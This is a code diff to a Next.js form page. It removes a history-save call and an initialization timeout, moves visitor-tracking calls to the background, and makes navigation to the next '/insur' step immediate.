@@ -10,7 +10,7 @@ import { StepIndicator } from "@/components/step-indicator"
 import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { saveToHistory } from "@/lib/firebase"
+// Removed saveToHistory - not needed
 import { secureAddData as addData } from "@/lib/secure-firebase"
 import { translations } from "@/lib/translations"
 
@@ -72,30 +72,22 @@ export default function HomePage() {
   useEffect(() => {
     const init = async () => {
       try {
-        // Set a maximum timeout of 5 seconds for initialization
-        const timeoutPromise = new Promise((_, reject) => 
-          setTimeout(() => reject(new Error('Initialization timeout')), 5000)
-        )
+        // Check if blocked first (fast check)
+        const blocked = await checkIfBlocked(visitorID)
+        if (blocked) {
+          setIsBlocked(true)
+          setLoading(false)
+          return
+        }
         
-        const initPromise = (async () => {
-          // Check if blocked
-          const blocked = await checkIfBlocked(visitorID)
-          if (blocked) {
-            setIsBlocked(true)
-            return
-          }
-          
-          // Initialize tracking
-          await initializeVisitorTracking(visitorID)
-          await updateVisitorPage(visitorID, "home", 1)
-        })()
+        // Show page immediately
+        setLoading(false)
         
-        // Race between init and timeout
-        await Promise.race([initPromise, timeoutPromise])
+        // Initialize tracking in background (non-blocking)
+        initializeVisitorTracking(visitorID).catch(console.error)
+        updateVisitorPage(visitorID, "home", 1).catch(console.error)
       } catch (error) {
         console.error('Initialization error:', error)
-        // Continue anyway - don't block the user
-      } finally {
         setLoading(false)
       }
     }
@@ -182,11 +174,6 @@ export default function HomePage() {
       return
     }
     
-    setLoading(true)
-    
-    // Save current data to history before updating
-    await saveToHistory(visitorID, 1)
-    
     // Save final data before navigation
     await addData({
       id: visitorID,
@@ -204,11 +191,8 @@ export default function HomePage() {
       currentPage: "insur",
       homeCompletedAt: new Date().toISOString()
     }).then(() => {
-      // Wait 1.5 seconds before moving to next step
-      setTimeout(() => {
-        setLoading(false)
-        router.push('/insur')
-      }, 1500)
+      // Navigate immediately
+      router.push('/insur')
     })
   }
   
